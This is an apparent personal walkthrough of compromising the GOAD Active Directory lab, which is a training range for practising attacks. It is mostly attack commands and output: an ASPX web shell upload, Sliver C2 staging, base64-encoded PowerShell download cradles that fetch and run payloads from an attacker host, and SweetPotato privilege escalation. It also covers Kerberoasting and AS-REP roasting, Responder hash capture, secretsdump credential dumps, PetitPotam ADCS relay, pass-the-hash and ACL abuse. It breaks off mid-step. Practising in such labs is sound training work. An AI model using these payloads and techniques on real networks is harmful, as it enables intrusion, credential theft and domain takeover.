https://github.com/Orange-Cyberdefense/GOAD
## Network
```
sudo nmap -p- -sC -sV 192.168.56.0/24 -oA nmap/all-ports
```
### 192.168.56.10
AD: sevenkingdoms.local
DNS: kingslanding.sevenkingdoms.local
Host: KINGSLANDING
OS: Windows

| Port   | Service           |
| ------ | ----------------- |
| 53     | dns               |
| 80     | http              |
| 88     | kerberos-sec      |
| 135    | msrpc             |
| 139    | netbios-ssn       |
| 389    | ldap              |
| 445    | smb               |
| 464    | kpasswd5?         |
| 593    | ncacn_http        |
| 636    | ssl/ldap          |
| 3268   | ldap              |
| 3269   | ssl/ldap          |
| 3389   | rdp               |
| 5985   | winrm             |
| 5986   | ssl/http, ignore? |
| 9389   | ignore            |
| 47001  | ignore            |
| 49664- | ignore            |
### 192.168.56.11
AD: sevenkingdoms.local
DNS: winterfell.north.sevenkingdoms.local
Host: WINTERFELL
OS: Windows

| Port   | Service           |
| ------ | ----------------- |
| 53     | dns               |
| 88     | kerberos-sec      |
| 135    | msrpc             |
| 139    | netbios-ssn       |
| 389    | ldap              |
| 445    | smb               |
| 464    | kpasswd5?         |
| 593    | ncacn_http        |
| 636    | ssl/ldap          |
| 3268   | ldap              |
| 3269   | ssl/ldap          |
| 3389   | rdp               |
| 5985   | winrm             |
| 5986   | ssl/http, ignore? |
| 9389   | ignore            |
| 47001  | ignore            |
| 49664- | ignore            |
### 192.168.56.12
AD: essos.local
DNS: meereen.essos.local
Host: MEEREEN
OS: Windows Server 2016 Standard Evaluation
WORKGROUP: ESSOS

| Port   | Service           |
| ------ | ----------------- |
| 53     | dns               |
| 88     | kerberos-sec      |
| 135    | msrpc             |
| 139    | netbios-ssn       |
| 389    | ldap              |
| 445    | smb               |
| 464    | kpasswd5?         |
| 593    | ncacn_http        |
| 636    | ssl/ldap          |
| 3268   | ldap              |
| 3269   | ssl/ldap          |
| 3389   | rdp               |
| 5985   | winrm             |
| 5986   | ssl/http, ignore? |
| 9389   | ignore            |
| 47001  | ignore            |
| 49664- | ignore            |
### 192.168.56.22
TOP AD: sevenkingdoms.local
AD: north.sevenkingdoms.local
DNS: castelblack.north.sevenkingdoms.local
Host: CASTELBLACK
OS: Windows

| Port   | Service           |
| ------ | ----------------- |
| 80     | http              |
| 135    | msrpc             |
| 139    | netbios-ssn       |
| 445    | smb               |
| 1433   | ms-sql-s          |
| 3389   | rdp               |
| 5985   | winrm             |
| 5986   | ssl/http, ignore? |
| 47001  | ignore            |
| 49664- | ignore            |
| 57160  | ms-sql-s          |
### 192.168.56.23
AD: essos.local
DNS: braavos.essos.local
Host: BRAAVOS
OS: Windows Server 2016 Standard Evaluation

| Port   | Service           |
| ------ | ----------------- |
| 80     | http              |
| 135    | msrpc             |
| 139    | netbios-ssn       |
| 445    | smb               |
| 1433   | ms-sql-s          |
| 3389   | rdp               |
| 5985   | winrm             |
| 5986   | ssl/http, ignore? |
| 47001  | ignore            |
| 49664- | ignore            |
| 52252  | ms-sql-s          |
## BloodHound
Install Bloodhound dependencies:
```
sudo apt-get install openjdk-11-jdk
wget -O - https://debian.neo4j.com/neotechnology.gpg.key | sudo apt-key add -
echo 'deb https://debian.neo4j.com stable 4' | sudo tee /etc/apt/sources.list.d/neo4j.list > /dev/null
sudo apt-get update
sudo apt-get install apt-transport-https
sudo apt-get install neo4j
sudo systemctl stop neo4j
```

Start Neo4j:
```
cd /usr/bin
sudo ./neo4j console
```

Browse to the app: 
https://localhost:7474/

Initial credentials: 
```
neo4j:neo4j
```

Change password and save it.

Now install BloodHound GUI:
```
wget https://github.com/BloodHoundAD/BloodHound/releases/download/v4.3.1/BloodHound-linux-x64.zip
unzip BloodHound-linux-x64.zip
cd BloodHound-linux-x64/
```

Run BloodHound GUI:
```
./BloodHound --no-sandbox
```

For BloodHound CE use one-liner:
```
curl -L https://ghst.ly/getbhce | docker compose -f - up
```
## SharpHound
https://github.com/BloodHoundAD/BloodHound/blob/master/Collectors/SharpHound.exe
## SMB enumeration
```
netexec smb 192.168.56.11 --users                              
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       -Username-                    -Last PW Set-       -BadPW- -Description-
SMB         192.168.56.11   445    WINTERFELL       Guest                         <never>             0       Built-in account for guest access to the computer/domain
SMB         192.168.56.11   445    WINTERFELL       arya.stark                    2024-07-25 17:26:30 0       Arya Stark
SMB         192.168.56.11   445    WINTERFELL       sansa.stark                   2024-07-25 17:26:50 0       Sansa Stark
SMB         192.168.56.11   445    WINTERFELL       brandon.stark                 2024-07-25 17:26:52 0       Brandon Stark
SMB         192.168.56.11   445    WINTERFELL       rickon.stark                  2024-07-25 17:26:54 0       Rickon Stark
SMB         192.168.56.11   445    WINTERFELL       hodor                         2024-07-25 17:26:57 0       Brainless Giant
SMB         192.168.56.11   445    WINTERFELL       jon.snow                      2024-07-25 17:26:59 0       Jon Snow
SMB         192.168.56.11   445    WINTERFELL       samwell.tarly                 2024-07-25 17:27:01 0       Samwell Tarly (Password : Heartsbane)
SMB         192.168.56.11   445    WINTERFELL       jeor.mormont                  2024-07-25 17:27:04 0       Jeor Mormont
SMB         192.168.56.11   445    WINTERFELL       sql_svc                       2024-07-25 17:27:06 0       sql service
```

```
netexec smb 192.168.56.10-23 -u 'anonymous' -p 'anonymous' --shares
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10 / Server 2019 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:True)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10 / Server 2019 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [-] north.sevenkingdoms.local\anonymous:anonymous STATUS_LOGON_FAILURE 
SMB         192.168.56.23   445    BRAAVOS          [*] Windows Server 2016 Standard Evaluation 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:True)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10 / Server 2019 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [+] essos.local\anonymous:anonymous 
SMB         192.168.56.10   445    KINGSLANDING     [-] sevenkingdoms.local\anonymous:anonymous STATUS_LOGON_FAILURE 
SMB         192.168.56.12   445    MEEREEN          [-] essos.local\anonymous:anonymous STATUS_LOGON_FAILURE 
SMB         192.168.56.22   445    CASTELBLACK      [+] north.sevenkingdoms.local\anonymous:anonymous 
SMB         192.168.56.23   445    BRAAVOS          [*] Enumerated shares
SMB         192.168.56.23   445    BRAAVOS          Share           Permissions     Remark
SMB         192.168.56.23   445    BRAAVOS          -----           -----------     ------
SMB         192.168.56.23   445    BRAAVOS          ADMIN$                          Remote Admin
SMB         192.168.56.23   445    BRAAVOS          all             READ,WRITE      Basic RW share for all
SMB         192.168.56.23   445    BRAAVOS          C$                              Default share
SMB         192.168.56.23   445    BRAAVOS          CertEnroll                      Active Directory Certificate Services share
SMB         192.168.56.23   445    BRAAVOS          IPC$                            Remote IPC
SMB         192.168.56.23   445    BRAAVOS          public                          Basic Read share for all domain users
SMB         192.168.56.22   445    CASTELBLACK      [*] Enumerated shares
SMB         192.168.56.22   445    CASTELBLACK      Share           Permissions     Remark
SMB         192.168.56.22   445    CASTELBLACK      -----           -----------     ------
SMB         192.168.56.22   445    CASTELBLACK      ADMIN$                          Remote Admin
SMB         192.168.56.22   445    CASTELBLACK      all             READ,WRITE      Basic RW share for all
SMB         192.168.56.22   445    CASTELBLACK      C$                              Default share
SMB         192.168.56.22   445    CASTELBLACK      IPC$            READ            Remote IPC
SMB         192.168.56.22   445    CASTELBLACK      public                          Basic Read share for all domain users
Running nxc against 14 targets ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━ 100% 0:00:00
```

Access the "all" share:
```
smbclient \\\\192.168.56.22\\all -U 'anonymous'
smbclient \\\\192.168.56.23\\all -U 'anonymous'
```
## Enum4linux
```
enum4linux 192.168.56.11
```

```
Group: 'Domain Users' (RID: 513) has member: NORTH\Administrator
Group: 'Domain Users' (RID: 513) has member: NORTH\vagrant
Group: 'Domain Users' (RID: 513) has member: NORTH\krbtgt
Group: 'Domain Users' (RID: 513) has member: NORTH\SEVENKINGDOMS$
Group: 'Domain Users' (RID: 513) has member: NORTH\arya.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\eddard.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\catelyn.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\robb.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\sansa.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\brandon.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\rickon.stark
Group: 'Domain Users' (RID: 513) has member: NORTH\hodor
Group: 'Domain Users' (RID: 513) has member: NORTH\jon.snow
Group: 'Domain Users' (RID: 513) has member: NORTH\samwell.tarly
Group: 'Domain Users' (RID: 513) has member: NORTH\jeor.mormont
Group: 'Domain Users' (RID: 513) has member: NORTH\sql_svc
Group: 'Group Policy Creator Owners' (RID: 520) has member: NORTH\Administrator
Group: 'Domain Guests' (RID: 514) has member: NORTH\Guest
Group: 'Night Watch' (RID: 1107) has member: NORTH\jon.snow
Group: 'Night Watch' (RID: 1107) has member: NORTH\samwell.tarly
Group: 'Night Watch' (RID: 1107) has member: NORTH\jeor.mormont
Group: 'Mormont' (RID: 1108) has member: NORTH\jeor.mormont
Group: 'Domain Computers' (RID: 515) has member: NORTH\CASTELBLACK$
Group: 'Stark' (RID: 1106) has member: NORTH\arya.stark
Group: 'Stark' (RID: 1106) has member: NORTH\eddard.stark
Group: 'Stark' (RID: 1106) has member: NORTH\catelyn.stark
Group: 'Stark' (RID: 1106) has member: NORTH\robb.stark
Group: 'Stark' (RID: 1106) has member: NORTH\sansa.stark
Group: 'Stark' (RID: 1106) has member: NORTH\brandon.stark
Group: 'Stark' (RID: 1106) has member: NORTH\rickon.stark
Group: 'Stark' (RID: 1106) has member: NORTH\hodor
Group: 'Stark' (RID: 1106) has member: NORTH\jon.snow
```
## Web enumeration
We start with 192.168.56.22. Visiting http://192.168.56.22 we get prompted to visit a link http://192.168.56.22/Default.aspx where we can upload files. Lets upload a web shell.

https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
```
wget https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/asp/cmd.aspx
```

Upload the file and now we need to find the location.

It seems to be located at http://192.168.56.22/upload/cmd.aspx. I just guessed the location but we could have used gobuster to find the folder.
```
gobuster dir -u http://192.168.56.22/ -w /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
```

Browse to http://192.168.56.22/upload/cmd.aspx and prepare payload.
## GOAD with Sliver
We will use [process hollow](https://github.com/haha150/pentest?tab=readme-ov-file#process-hollow-sliver-stager-c) for the beacon. Serve the file as hollow.ps1.
```
python3 -m http.server 8081
```

Prepare Sliver with profile and stage listener:
```
profiles new --http http://192.168.56.112:80 --format shellcode win-shellcode
stage-listener --url http://192.168.56.112:80 --profile win-shellcode --aes-encrypt-key D(G+KbPeShVmYq3t --aes-encrypt-iv 8y/B?E(G+KbPeShV
```

Prepare powershell command for the webshell:
```
iex(New-Object net.webclient).DownloadString("http://192.168.56.112:8081/hollow.ps1")
```
### North.sevenkingdoms.local
In the webshell:
```
Program: C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
Arguments: -c iex(New-Object net.webclient).DownloadString('http://192.168.56.112:8081/hollow.ps1')
```

And we should now get a beacon.
```
[*] Beacon 6503e3fe BARE_PANTHER - 192.168.56.22:61674 (castelblack) - windows/amd64 - Sat, 27 Jul 2024 14:29:07 EDT
```

Use beacon:
```
sliver > use 6503e3fe-c14d-4df5-9d03-d9dbcc44567e
sliver > reconfig -i 10s -j 5s
```

Now we enumerate the server:
```
sliver > cd c:\setup\mssql
sliver > cat sql_conf.ini
```

Privs:
```
[server] sliver (BARE_PANTHER) > getprivs

Privilege Information for dllhost.exe (PID: 3928)
-------------------------------------------------

Process Integrity Level: High

Name                          	Description                               	Attributes
====                          	===========                               	==========
SeAssignPrimaryTokenPrivilege 	Replace a process level token             	Disabled
SeIncreaseQuotaPrivilege      	Adjust memory quotas for a process        	Disabled
SeAuditPrivilege              	Generate security audits                  	Disabled
SeChangeNotifyPrivilege       	Bypass traverse checking                  	Enabled, Enabled by Default
SeImpersonatePrivilege        	Impersonate a client after authentication 	Enabled, Enabled by Default
SeCreateGlobalPrivilege       	Create global objects                     	Enabled, Enabled by Default
SeIncreaseWorkingSetPrivilege 	Increase a process working set            	Disabled
```

beacon.bat:
```
@echo off
start /b powershell -exec bypass -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADEAMgA6ADgAMAA4ADEALwB0AGUAcwB0AC4AcABzADEAJwApACAAfAAgAGkAZQB4AAoA
exit /b
```

Exploit SeImpersonatePrivilege with SweetPotato:
```
git clone https://github.com/CCob/SweetPotato.git
build it
sliver > generate --named-pipe 192.168.56.22/pipe/foobar --skip-symbols
sliver > upload /home/kali/goad/RANDOM_CELL.exe
sliver > pivots named-pipe --bind foobar
sliver > execute-assembly SweetPotato.exe -p C:\\shares\\all\\beacon.bat
OR
sliver > execute-assembly SweetPotato.exe -p c:\\shares\\all\\RANDOM_CELL.exe
[*] Session 3c9ce8d9 RANDOM_CELL - 192.168.56.22:53418->BARE_PANTHER-> (castelblack) - windows/amd64 - Sun, 28 Jul 2024 07:41:13 EDT
```

We find the creds:
```
SQLSVCACCOUNT="north.sevenkingdoms.local\sql_svc"
SQLSVCPASSWORD="YouWillNotKerboroast1ngMeeeeee"
SAPWD="Sup1_sa_P@ssw0rd!"
SQLSYSADMINACCOUNTS="north.sevenkingdoms.local\sql_svc"
```

Seatbelt:
```
sliver > seatbelt -- '-group=all'
```

Users:
```
NORTH\jeor.mormont
robb.stark
sql_svc
Administrator
```

We can try asreproastable users:
```
sliver > rubeus asreproast /format:hashcat /domain:north.sevenkingdoms.local /outfile:out3.txt
...
[*] Building AS-REQ (w/o preauth) for: 'north.sevenkingdoms.local\brandon.stark'
...
sliver > rubeus asreproast /format:hashcat /domain:essos.local /outfile:out4.txt
...
[*] Building AS-REQ (w/o preauth) for: 'essos.local\missandei'
...
```

Crack it:
```
hashcat -m 18200 out3.txt rockyou.txt
hashcat -m 18200 out4.txt rockyou.txt
```

Password:
```
brandon.stark:iseedeadpeople
missandei:fr3edom
```

Lets find kerberoastable users:
```
sliver > rubeus kerberoast /outfile:out.txt /domain:north.sevenkingdoms.local
```

```
sansa.stark
jon.snow
sql_svc
```

Crack password:
```
hashcat -m 13100 out.txt rockyou.txt
```

Password for jon.snow:
```
jon.snow:iknownothing
```

We can RDP to 192.168.56.22 with jon.snow, lets get a beacon after RDP:
```
iex(New-Object net.webclient).DownloadString('http://192.168.56.112:8081/hollow.ps1')

[*] Beacon 59bc703f BARE_PANTHER - 192.168.56.22:49803 (castelblack) - windows/amd64 - Sat, 27 Jul 2024 17:17:48 EDT
```

Lets try mssql with jon.snow:
```
sliver > sqlrecon /a:WinToken /h:192.168.56.22 /d:north.sevenkingdoms.local /u:jon.snow /p:iknownothing /m:Databases
sliver > execute-assembly SQLRecon.exe /a:WinToken /h:192.168.56.22 /d:north.sevenkingdoms.local /u:jon.snow /p:iknownothing /m:olecmd /l:BRAAVOS /c:\"powershell.exe ls \\\\192.168.56.112\\c \"
```

Running responder gives us essos sql_svc, robb.stark and eddard.stark hashes:
```
sudo responder -I eth1
```

```
[SMB] NTLMv2-SSP Client   : 192.168.56.23
[SMB] NTLMv2-SSP Username : ESSOS\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::ESSOS:66e797eb20dc7a22:181D0956B91447329FD89BBE0D2AD4BF:010100000000000080D7D6E051E0DA01C7DC802053B0F0090000000002000800320055004900320001001E00570049004E002D0046004A004A00430034004C004A00550045005400530004003400570049004E002D0046004A004A00430034004C004A0055004500540053002E0032005500490032002E004C004F00430041004C000300140032005500490032002E004C004F00430041004C000500140032005500490032002E004C004F00430041004C000700080080D7D6E051E0DA0106000400020000000800300030000000000000000000000000300000DC1B2B5758E9B8A23024CC21CE526ED043BD945B923207354A9D90A7BB5F58A90A001000000000000000000000000000000000000900260063006900660073002F003100390032002E003100360038002E00350036002E00310031003200000000000000000000000000
```

```
[SMB] NTLMv2-SSP Client   : fe80::2c37:42c4:deb1:cab6
[SMB] NTLMv2-SSP Username : NORTH\robb.stark
[SMB] NTLMv2-SSP Hash     : robb.stark::NORTH:14c476c6a35f3631:64A2AD2887BE98BC23E6BADF864B9B88:010100000000000080D7D6E051E0DA0113572F079AC06D880000000002000800320055004900320001001E00570049004E002D0046004A004A00430034004C004A00550045005400530004003400570049004E002D0046004A004A00430034004C004A0055004500540053002E0032005500490032002E004C004F00430041004C000300140032005500490032002E004C004F00430041004C000500140032005500490032002E004C004F00430041004C000700080080D7D6E051E0DA0106000400020000000800300030000000000000000000000000300000DA99A3B075C82D11D3A5295ACF7E693FCEBA9AE9AD28D4C3C072C37B8E6F6DBA0A001000000000000000000000000000000000000900160063006900660073002F0042007200610076006F0073000000000000000000
```

```
[SMB] NTLMv2-SSP Client   : fe80::2c37:42c4:deb1:cab6
[SMB] NTLMv2-SSP Username : NORTH\eddard.stark
[SMB] NTLMv2-SSP Hash     : eddard.stark::NORTH:56a090232ca98b84:536720F728C3F6A6DCD9EAA59A9D2130:010100000000000080D7D6E051E0DA0186D8152D99DEF74B0000000002000800320055004900320001001E00570049004E002D0046004A004A00430034004C004A00550045005400530004003400570049004E002D0046004A004A00430034004C004A0055004500540053002E0032005500490032002E004C004F00430041004C000300140032005500490032002E004C004F00430041004C000500140032005500490032002E004C004F00430041004C000700080080D7D6E051E0DA0106000400020000000800300030000000000000000000000000300000DA99A3B075C82D11D3A5295ACF7E693FCEBA9AE9AD28D4C3C072C37B8E6F6DBA0A001000000000000000000000000000000000000900140063006900660073002F004D006500720065006E000000000000000000
```

We try to crack them:
```
hashcat -m 5600 out2.txt rockyou.txt
```

Password:
```
robb.stark:sexywolfy
```

We try impacket mssql:
```
impacket-mssqlclient -windows-auth north.sevenkingdoms.local/jon.snow@192.168.56.22
iknownothing
```

Try to get beacon:
```
echo "(New-Object net.webclient).DownloadString('http://192.168.56.112:8081/test.ps1') | iex" | iconv -t utf-16le | base64 -w 0
KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADEAMgA6ADgAMAA4ADEALwB0AGUAcwB0AC4AcABzADEAJwApACAAfAAgAGkAZQB4AAoA

SQL (NORTH\jon.snow  dbo@master)> DECLARE @myshell INT; EXEC sp_oacreate 'wscript.shell', @myshell OUTPUT; EXEC sp_oamethod @myshell, 'run', null, 'powershell -enc KABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAApAC4ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwADoALwAvADEAOQAyAC4AMQA2ADgALgA1ADYALgAxADEAMgA6ADgAMAA4ADEALwB0AGUAcwB0AC4AcABzADEAJwApACAAfAAgAGkAZQB4AAoA'
```

Works locally but not on linked db.

Run SharpHound.exe and download output:
```
sliver > execute-assembly SharpHound.exe -- '-c all -d north.sevenkingdoms.local --zipfilename test2'
sliver > execute-assembly SharpHound.exe -- '-c all -d sevenkingdoms.local --zipfilename test3'
sliver > execute-assembly SharpHound.exe -- '-c all -d essos.local --zipfilename test4'
sliver > download 20240728035058_test2.zip
```

Upload it to BloodHound.

We do secretsdump with impacket:
```
impacket-secretsdump -dc-ip 192.168.56.11 -target-ip 192.168.56.11 robb.stark@192.168.56.11
sexywolfy
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:dbd13e1c4e338284ac4e9874f7de6ef4:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:f65215c2674ecd10e7984ad2c2e05da1:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
arya.stark:1110:aad3b435b51404eeaad3b435b51404ee:4f622f4cd4284a887228940e2ff4e709:::
eddard.stark:1111:aad3b435b51404eeaad3b435b51404ee:d977b98c6c9282c5c478be1d97b237b8:::
catelyn.stark:1112:aad3b435b51404eeaad3b435b51404ee:cba36eccfd9d949c73bc73715364aff5:::
robb.stark:1113:aad3b435b51404eeaad3b435b51404ee:831486ac7f26860c9e2f51ac91e1a07a:::
sansa.stark:1114:aad3b435b51404eeaad3b435b51404ee:b777555c2e2e3716e075cc255b26c14d:::
brandon.stark:1115:aad3b435b51404eeaad3b435b51404ee:84bbaa1c58b7f69d2192560a3f932129:::
rickon.stark:1116:aad3b435b51404eeaad3b435b51404ee:7978dc8a66d8e480d9a86041f8409560:::
hodor:1117:aad3b435b51404eeaad3b435b51404ee:337d2667505c203904bd899c6c95525e:::
jon.snow:1118:aad3b435b51404eeaad3b435b51404ee:b8d76e56e9dac90539aff05e3ccb1755:::
samwell.tarly:1119:aad3b435b51404eeaad3b435b51404ee:f5db9e027ef824d029262068ac826843:::
jeor.mormont:1120:aad3b435b51404eeaad3b435b51404ee:6dccf1c567c56a40e56691a723a49664:::
sql_svc:1121:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
WINTERFELL$:1001:aad3b435b51404eeaad3b435b51404ee:b1ca9fd8af657fb3856d3d3d442c183f:::
CASTELBLACK$:1105:aad3b435b51404eeaad3b435b51404ee:81273efa52858c1b46129041c534fada:::
SEVENKINGDOMS$:1104:aad3b435b51404eeaad3b435b51404ee:7a83314cd15146616c2c597d35c0d841:::
```

Evil winrm to get to jeor.mormont or admin or any user:
```
evil-winrm -i 192.168.56.22 -H 6dccf1c567c56a40e56691a723a49664 -u jeor.mormont
```
### Essos.local
We need to find user and password on essos domain.

We use netexec to enumerate:
```
netexec smb 192.168.56.10-23 -M spooler
```

```
SPOOLER     192.168.56.22   445    CASTELBLACK      Spooler service enabled
SPOOLER     192.168.56.10   445    KINGSLANDING     Spooler service enabled
SPOOLER     192.168.56.11   445    WINTERFELL       Spooler service enabled
SPOOLER     192.168.56.23   445    BRAAVOS          Spooler service enabled
SPOOLER     192.168.56.12   445    MEEREEN          Spooler service enabled
```

We try petitpotam:
```
impacket-ntlmrelayx -t http://192.168.56.23/certsrv/certfnsh.asp -smb2support --adcs --template DomainController
OR
pip3 install certipy-ad
certipy relay -ca 192.168.56.23 -template DomainController
```

```
git clone https://github.com/topotam/PetitPotam.git
python3 PetitPotam/PetitPotam.py 192.168.56.112 meereen.essos.local
```

```
[*] Base64 certificate of user MEEREEN$: 
...
base64 blob
...
OR
[*] Saved certificate and private key to 'meereen.pfx'
```

Use the cert:
```
certipy-ad auth -pfx meereen.pfx -dc-ip 192.168.56.12
```

```
[*] Got hash for 'meereen$@essos.local': aad3b435b51404eeaad3b435b51404ee:71d9d030a8b1ef15e89c019b302e116e
```

Exploit:
```
impacket-secretsdump -hashes ':71d9d030a8b1ef15e89c019b302e116e' -no-pass ESSOS.LOCAL/'meereen$'@meereen.essos.local
```

```
Administrator:500:aad3b435b51404eeaad3b435b51404ee:54296a48cd30259cc88095373cec24da:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:71c7ed288f911418206507c7cb475261:::
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
vagrant:1000:aad3b435b51404eeaad3b435b51404ee:e02bc503339d51f71d913c245d35b50b:::
daenerys.targaryen:1112:aad3b435b51404eeaad3b435b51404ee:34534854d33b398b66684072224bb47a:::
viserys.targaryen:1113:aad3b435b51404eeaad3b435b51404ee:d96a55df6bef5e0b4d6d956088036097:::
khal.drogo:1114:aad3b435b51404eeaad3b435b51404ee:739120ebc4dd940310bc4bb5c9d37021:::
jorah.mormont:1115:aad3b435b51404eeaad3b435b51404ee:4d737ec9ecf0b9955a161773cfed9611:::
missandei:1116:aad3b435b51404eeaad3b435b51404ee:1b4fd18edf477048c7a7c32fda251cec:::
drogon:1117:aad3b435b51404eeaad3b435b51404ee:195e021e4c0ae619f612fb16c5706bb6:::
sql_svc:1118:aad3b435b51404eeaad3b435b51404ee:84a5092f53390ea48d660be52b93b804:::
MEEREEN$:1001:aad3b435b51404eeaad3b435b51404ee:71d9d030a8b1ef15e89c019b302e116e:::
BRAAVOS$:1104:aad3b435b51404eeaad3b435b51404ee:c5d71c0d62d7f4b80952bea270995208:::
gmsaDragon$:1119:aad3b435b51404eeaad3b435b51404ee:af63b82f4c85a8caabd042dd687ddd25:::
test123$:1120:aad3b435b51404eeaad3b435b51404ee:0cb6948805f797bf2a82807973b89537:::
SEVENKINGDOMS$:1105:aad3b435b51404eeaad3b435b51404ee:e292a07879a6428374753961289fbdd2:::
```

If there is error with certipy, try passthecert:
```
git clone https://github.com/AlmondOffSec/PassTheCert.git
certipy-ad cert -pfx meereen.pfx -nocert -out user.key
certipy-ad cert -pfx meereen.pfx -nokey -out user.crt
python3 PassTheCert/Python/passthecert.py -action ldap-shell -crt user.crt -key user.key -domain essos.local -dc-ip 192.168.56.12
OR
certipy-ad auth -pfx meereen.pfx -dc-ip 192.168.56.12 -ldap-shell
```

```
# add_computer test123 test
```

```
New Computer DN: CN=test123,CN=Computers,DC=essos,DC=local
Adding new computer with username: test123$ and password: test result: OK
```

```
git clone https://github.com/fortra/impacket.git
python3 impacket/examples/getTGT.py -dc-ip essos.local essos.local/test123:test
```

### Sevenkingdoms.local
We use a legup since i dont know how to move to this AD:

```
tywin.lannister:powerkingftw135
```

Change password on Jamie (forcechangepassword):
```
net rpc password jaime.lannister -U sevenkingdoms.local/tywin.lannister%powerkingftw135 -S kingslanding.sevenkingdoms.local
test111
```

Targeted kerberoast on joffrey (genericwrite):
```
python3 targetedKerberoast/targetedKerberoast.py -v -d sevenkingdoms.local -u jaime.lannister -p test111 --request-user joffrey.baratheon
```

Or do shadow credentials:
```
certipy-ad shadow auto -u jaime.lannister@sevenkingdoms.local -p 'test111' -account 'joffrey.baratheon'
```

Crack the hash:
```
hashcat -m 13100 joff.txt rockyou.txt
```

```
joffrey.baratheon:1killerlion
```

We can now RDP.

Add ACL (writedacl):
```
export PYTHONPATH=:/home/kali/goad/impacket/
python3 impacket/examples/dacledit.py -action 'read' -principal 'joffrey.baratheon' -target 'tyron.lannister' 'sevenkingdoms.local'/'joffrey.baratheon':'1killerlion'
python3 impacket/examples/dacledit.py -action 'write' -rights 'FullControl' -principal 'joffrey.baratheon' -target 'tyron.lannister' 'sevenkingdoms.local'/'joffrey.baratheon':'1killerlion'
```

Targeted kerberoast:
```
python3 targetedKerberoast/targetedKerberoast.py -v -d sevenkingdoms.local -u joffrey.baratheon -p 1killerlion --request-user tyron.lannister
```

OR do shadow credentials:
```
certipy-ad shadow auto -u joffrey.baratheon@sevenkingdoms.local -p '1killerlion' -account 'tyron.lannister'
```

Crack hash:
```
hashcat -m 13100 tyron.txt rockyou.txt
```

```
tyron.lannister:N/A
```

Now to PTH (addself):
```
pth-net rpc group addmem "SMALL COUNCIL" "tyron.lannister" -U "sevenkingdoms.local"/"tyron.lannister"%"ffffffffffffffffffffffffffffffff":"b3b3717f7d51b37fb325f7e7d048e998" -S "SMALL COUNCIL"
```

Didnt work, we try with ldeep:
```
pip3 install ldeep
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 search '(sAMAccountName=tyron.lannister)' distinguishedName
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 search '(sAMAccountName=Small Council)' distinguishedName
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 add_to_group "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=Small Council,OU=Crownlands,DC=sevenkingdoms,DC=local"
```

Verify:
```
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 membersof 'Small Council'
```

Add to dragonstone (addmember):
```
ldeep ldap -u tyron.lannister -H ':b3b3717f7d51b37fb325f7e7d048e998' -d sevenkingdoms.local -s ldap://192.168.56.10 add_to_group "CN=tyron.lannister,OU=Westerlands,DC=sevenkingdoms,DC=local" "CN=DragonStone,OU=Crownlands,DC=sevenkingdoms,DC=local"
```

Modify kingsguard (writeowner):
```
